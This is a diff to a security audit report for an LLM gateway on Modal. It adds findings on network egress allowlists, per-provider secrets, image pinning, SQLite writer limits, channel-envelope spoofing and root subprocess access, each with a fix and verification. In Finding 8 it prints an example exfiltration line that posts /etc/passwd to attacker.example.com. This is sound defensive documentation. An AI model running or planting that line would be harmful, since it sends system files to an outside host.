@@ -317,6 +317,208 @@ All three are inherent to sharing one Python process and PID: any code can impor
 #### Solution
 The genuine fix is process/container isolation: run untrusted adapter and tool code in a separate container (and PID namespace) from the gateway core, so the pairing store, the gateway process itself, and the cost-ledger writer sit behind a boundary that in-process code cannot reach — the same direction as Finding 4's broker split. Concretely: the pairing store and a signed cost-ledger writer move behind that process boundary, and a separate PID namespace stops the self-kill. This is an environmental/architectural layer, not an application patch — a shared process cannot prevent these, so a code change here would not be an honest fix.
 
+Findings 8–9 below build exactly that kind of process boundary for the provider-call path (isolated per-provider Sandboxes with their own Secret and no ambient access to the gateway's other state). The same broker/Sandbox pattern is the natural place a future signed cost-ledger writer would live — it isn't built yet, so cost-ledger poisoning stays open, but the infrastructure it would build on now exists.
+
+---
+
+## 8. Unbounded network egress (single Function, no egress wall)
+
+#### Invariant broken
+The gateway (and its provider-call path in particular) must only be able to reach a known, approved set of destinations — not arbitrary hosts on the internet.
+
+#### What's the problem?
+The gateway ran as a plain Modal Function. A Function has no outbound network restriction at all: any code that runs in it can reach any host. This was already visible in Finding 3's evidence — the gateway's own error message showed it reaching `generativelanguage.googleapis.com` — and nothing in the configuration would have stopped the same code reaching an attacker-controlled host instead:
+```python
+import httpx
+httpx.post("https://attacker.example.com/exfil", content=open("/etc/passwd").read())
+```
+Modal Functions expose no `outbound_domain_allowlist`/`outbound_cidr_allowlist` — only Sandboxes do (confirmed directly against the installed SDK: `inspect.signature(modal.Sandbox.create)` has `outbound_domain_allowlist`; `inspect.signature(app.function)` does not, only an all-or-nothing `block_network`).
+
+#### Root cause
+Wrapping the whole gateway as a single Modal Function (Move 1) gave every component — including the provider-call path — the Function's default unrestricted egress. There was no primitive available at the Function level to scope it down to only the hosts a given call actually needs.
+
+#### Solution
+Chat/router provider calls now run inside per-provider Modal **Sandboxes** (`glc/security/broker.py`, `SandboxBroker`), each created with `outbound_domain_allowlist=[<that provider's exact API host>]` — `generativelanguage.googleapis.com` for Gemini, `api.groq.com` for Groq, and so on for each of the six providers. A sandboxed call can reach its own provider and nothing else.
+
+- Files touched: `glc/security/broker.py` (`SandboxBroker`, `HybridBroker`), `glc/security/broker_entrypoint.py` (new), `modal_app.py`.
+
+Verified directly against the allowlist mechanism (isolated test, same API used in production): an allowed domain succeeds, a domain not on the list is rejected at the network layer before any data leaves:
+```console
+creating sandbox with outbound_domain_allowlist=['example.com']...
+--- exec: reach ALLOWED domain (example.com) ---
+STATUS 200
+
+--- exec: reach BLOCKED domain (google.com, not on allowlist) ---
+blocking all outbound connections to google.com (not on allow-list)
+Traceback (most recent call last):
+  ...
+httpcore.ConnectError: ...
+```
+And end-to-end on the live deployment: a real chat request fans out across all six provider sandboxes, each reaching *only* its own provider's real API (visible in the gateway's own logs — each provider failed on the mock key, at its own real endpoint, not on a network restriction):
+```text
+attempts: [
+  {'provider': 'gemini', 'reason': "... gemini HTTP 400: ... API key not valid ..."},
+  {'provider': 'groq', 'reason': '... groq HTTP 401: ... Invalid API Key ...'},
+  {'provider': 'cerebras', 'reason': '... cerebras HTTP 401: ... Wrong API Key ...'},
+  ...
+]
+```
+
+One necessary caveat, matching the finding's own framing: an egress allowlist is one layer, not the whole fix — data can still leave through an allowed channel (e.g. embedded in a legitimate reply). embed/stt/tts calls also still run through the unrestricted Function path (`broker_exec_shared`), not a Sandbox — see Finding 9's scope note.
+
+## 9. One Secret for the whole Function (provider keys not per-slot)
+
+#### Invariant broken
+A provider key belongs to exactly one component. Compromising the code path for one provider must not expose any other provider's key.
+
+#### What's the problem?
+Finding 4 isolated provider keys away from the *gateway* (into a broker), which closed the demonstrated in-process key dump. But inside the broker itself, all six provider keys still lived in one bundled Secret (`glc-llm-keys`) mounted to one Function — so any code running in that one broker container could still read every key, not just the one it needed for the current call.
+
+#### Root cause
+Move 1 wrapped the whole gateway as a single Function with one shared Secret. Finding 4 split gateway-vs-broker, but didn't yet split the broker itself by provider — the six keys still arrived together as one unit.
+
+#### Solution
+Each of the six LLM providers now has its own Modal Secret (`glc-key-gemini`, `glc-key-groq`, `glc-key-nvidia`, `glc-key-cerebras`, `glc-key-openrouter`, `glc-key-github`) and its own execution context — a dedicated Sandbox for chat/router calls (Finding 8), each created with only that one provider's Secret. A compromised `gemini` sandbox never had `GROQ_API_KEY` or any of the other four keys in its environment at all.
+
+- Files touched: `modal_app.py` (per-provider Secrets, per-provider `broker_exec_<provider>` Functions used as the embed/stt/tts fallback path, `SandboxBroker` wiring), `glc/security/broker.py`.
+
+Verified live — the same leak-1 snippet, run inside each provider's own container:
+```console
+$ modal run modal_app.py::app.check_provider_env_gemini
+[broker_exec_<provider>] provider keys present:
+    GEMINI_API_KEY = True
+    GROQ_API_KEY = False
+    NVIDIA_API_KEY = False
+    CEREBRAS_API_KEY = False
+    OPEN_ROUTER_API_KEY = False
+    GITHUB_ACCESS_TOKEN = False
+
+$ modal run modal_app.py::app.check_provider_env_groq
+[broker_exec_<provider>] provider keys present:
+    GEMINI_API_KEY = False
+    GROQ_API_KEY = True
+    NVIDIA_API_KEY = False
+    ...
+```
+
+Scope note: embed/stt/tts calls still run through a shared-bundle Function (`broker_exec_shared`, holding all six keys) rather than a per-provider Sandbox — those call kinds don't cleanly map to "exactly one provider, known up front" the way chat/router do, and closing that residual gap is future work.
+
+## 10. Non-reproducible image
+
+#### Invariant broken
+The container that gets deployed must be the same container that was built and tested — not a moving target that can silently resolve to different package versions between builds.
+
+#### What's the problem?
+The image built from a rolling `debian_slim(python_version="3.11")` tag (no digest pin) and a hand-copied `pip_install(...)` list using loose `>=` ranges — a second, independent copy of `pyproject.toml`'s dependency list that could drift from it, and that ignored the repository's real `uv.lock` entirely. Diffed directly: the `pip_install(...)` list was a byte-for-byte duplicate of `pyproject.toml`'s `dependencies`, kept in sync by hand.
+
+#### Root cause
+The Modal image definition was written independently of the project's own dependency management (`uv`/`pyproject.toml`/`uv.lock`), so nothing enforced that a rebuild resolved to the exact versions actually locked and tested.
+
+#### Solution
+The base image is now pinned by digest (`python:3.11-slim@sha256:db3ff2e1...`, resolved 2026-07-19) instead of a rolling tag, and dependencies are installed via `Image.uv_sync()` (`frozen=True` by default), which builds from the repository's actual `pyproject.toml`/`uv.lock` and refuses to silently update the lock at build time.
+
+- Files touched: `modal_app.py`.
+
+```python
+# before
+modal.Image.debian_slim(python_version="3.11").pip_install(
+    "fastapi>=0.110", "uvicorn[standard]>=0.27", ...  # hand-copied, loose ranges
+)
+
+# after
+_PYTHON_SLIM_PINNED = "python:3.11-slim@sha256:db3ff2e1800a8581e2c48a27c3995339d47bdf046da21c7627accd3d51053a93"
+modal.Image.from_registry(_PYTHON_SLIM_PINNED).uv_sync()  # from uv.lock, frozen
+```
+
+## 11. Audit volume assumes one writer
+
+#### Invariant broken
+The audit/pairing/cost-ledger SQLite databases must have exactly one writer at a time, and a completed write must be durable, not lost on container recycling.
+
+#### What's the problem?
+The gateway Function had no `max_containers` cap, so Modal could scale it to more than one concurrent container, each opening its own SQLite connection against the same file on the shared Volume — SQLite doesn't arbitrate writers across separate containers. Separately, the code never called `Volume.commit()`/`reload()`; per the SDK's own documentation, a write isn't "persisted in durable storage and available to other containers" until committed.
+
+#### Root cause
+The Volume was wired up (Move 1) without either of the two guarantees SQLite-on-a-shared-Volume needs: a single writer, and explicit commit discipline. Both were left implicit.
+
+#### Solution
+`max_containers=1` pins the gateway to exactly one container — this gateway is a single-installation deployment by design (one install token, one operator), so this isn't a throughput compromise, it matches the intended shape. A periodic (30s) and shutdown-time `Volume.commit()` was added by wrapping the app's existing lifespan, so writes are durable rather than relying on implicit background commit.
+
+- Files touched: `modal_app.py`.
+
+```python
+# before
+@app.function(image=gateway_image, volumes={"/data": data_volume}, secrets=[...])
+@modal.asgi_app()
+def fastapi_app():
+    ...
+    return web
+
+# after
+@app.function(image=gateway_image, volumes={"/data": data_volume}, secrets=[...], max_containers=1)
+@modal.asgi_app()
+def fastapi_app():
+    ...
+    # wraps web.router.lifespan_context: commits data_volume every 30s and on shutdown
+    return web
+```
+
+## 12. Cross-channel envelope spoofing
+
+#### Invariant broken
+An adapter connected to `WS /v1/channels/<name>` must only be able to act as `<name>` — it must not be able to claim a different channel's identity inside the envelope it sends.
+
+#### What's the problem?
+`glc/routes/channels.py`'s WebSocket handler took `name` from the route path but never checked it against `env.channel` (the value inside the message payload). A client connected on `/v1/channels/telegram` could send an envelope claiming `channel="discord"`, and the gateway would process it under Discord's allowlist, trust, and pairing rules — impersonating a different channel entirely.
+```python
+# connected to WS /v1/channels/telegram, but the envelope claims to be Discord
+ChannelMessage(channel="discord", channel_user_id="attacker-id", ...)
+```
+
+#### Root cause
+The route parameter (`name`, the authenticated connection's channel) and the envelope's own `channel` field were never cross-checked — the handler trusted whatever the message body claimed.
+
+#### Solution
+One application-layer check: reject any envelope whose `channel` doesn't match the route it arrived on, log the attempt, and close the socket.
+
+- Files touched: `glc/routes/channels.py`, `tests/test_channel_spoof.py` (new).
+
+```python
+# before
+env = ChannelMessage.model_validate(payload)
+ok, why = allowed(env.channel, env.channel_user_id, ...)   # env.channel trusted as-is
+
+# after
+env = ChannelMessage.model_validate(payload)
+if env.channel != name:
+    audit_append(channel=name, channel_user_id=env.channel_user_id, trust_level=env.trust_level,
+                 event_type="channel_spoof_attempt", result={"route": name, "envelope_channel": env.channel})
+    await websocket.send_text(json.dumps({"error": f"envelope channel {env.channel!r} does not match route {name!r}"}))
+    await websocket.close(code=status.WS_1008_POLICY_VIOLATION)
+    return
+ok, why = allowed(env.channel, env.channel_user_id, ...)
+```
+
+Verified with a real WebSocket round trip: a matching channel passes through normally; a mismatched one gets the rejection message and the socket is closed (`WebSocketDisconnect` on the next read) — both asserted in `tests/test_channel_spoof.py`.
+
+## 13. Unrestricted subprocess and shell access
+
+#### Invariant broken
+Code running in the gateway/broker containers should not have unrestricted shell and subprocess execution, and should not run as root.
+
+#### What's the problem?
+The deployed image gives any code full `subprocess`/shell access, running as root. The `whisper_cpp` speech-to-text adapter already shells out to a `whisper-cli` binary (`subprocess.run([cli, "-m", model, "-f", audio_path, "-oj"])`), and nothing about the image restricts any *other* code from doing the same:
+```console
+$ modal run leak7_check.py   # inside the actual deployed image type
+subprocess/shell result: uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### Root cause
+The image is Debian-based with a full shell and no non-root user configured, and Move 1's single monolithic image gave every component — including ones that never need to shell out — the same unrestricted execution environment.
+
+#### Solution
+**Not code-fixed in this pass.** The real fix (per-component minimal images, non-root execution, read-only filesystems, syscall filtering) requires restructuring where the `glc` package is mounted: the current working setup (Findings 8–11, all verified live) mounts and imports it from `/root/glc`, which a non-root user cannot read into by default (`/root` is `700 root:root`). Migrating to a non-root user needs a coordinated path change (e.g. `/app`) across the gateway image, the broker image, and `SandboxBroker`'s runtime-constructed image, all three of which are now working, verified infrastructure built during this pass. Making that change now, without room to re-validate each of those three paths end-to-end again, risked breaking Findings 8–11 to partially address a lower-severity residual gap. Documented honestly rather than shipped as a rushed fix — this is the next concrete step when picked back up: non-root user + `/app`-based mount, then read-only root filesystem and syscall filtering as follow-ups.
+
 <!--
 ## N. <finding title>
 
